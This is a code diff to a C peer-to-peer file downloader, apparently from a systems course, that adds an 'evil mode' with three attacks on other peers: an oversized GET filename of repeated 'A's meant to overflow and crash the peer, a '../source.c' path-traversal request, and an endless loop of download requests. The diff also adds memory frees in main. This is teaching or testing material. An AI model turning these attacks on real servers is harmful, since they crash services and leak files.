@@ -535,6 +535,47 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	//ATTACK 1: BUFFER OVERFLOW
+	if( evil_mode == 1){
+          t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+          if (t->peer_fd == -1) {
+            error("* Cannot connect to peer: %s\n", strerror(errno));
+            goto try_again;
+	  }
+
+          message("* Buffer overflow to crash downloader");
+
+          char evilBuffer[FILENAMESIZ*10];
+
+          memset(evilBuffer, 'A', FILENAMESIZ*10);
+
+          osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evilBuffer);
+        }
+
+	//ATTACK 2: PULL BAD FILE REQUEST
+	if(evil_mode == 2){
+          t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+          if (t->peer_fd == -1) {
+            error("* Cannot connect to peer: %s\n", strerror(errno));
+            goto try_again;
+	  }
+
+          char bad_file[FILENAMESIZ] = "../source.c";
+
+          osp2p_writef(t->peer_fd, "GET %s OSP2P\n", bad_file);
+        }
+
+	//REPEATEDLY GET FILE
+        while (evil_mode == 3){
+          t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	  if (t->peer_fd == -1) {
+	    error("* Cannot connect to peer: %s\n", strerror(errno));
+	    goto try_again;
+	  }
+
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+        }
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -850,7 +891,7 @@ int main(int argc, char *argv[])
 	    }
 	    else if (p < 0)
 	      error("Failed to fork.");
-	    
+	    task_free(t); 
 	  }
 	}
 	// Then accept connections from other peers and upload files to them!
@@ -862,6 +903,7 @@ int main(int argc, char *argv[])
 	  }
 	  else if (p < 0)
 	    error("Failed to fork.");
+	  task_free(t);
 	}
 	return 0;
 }
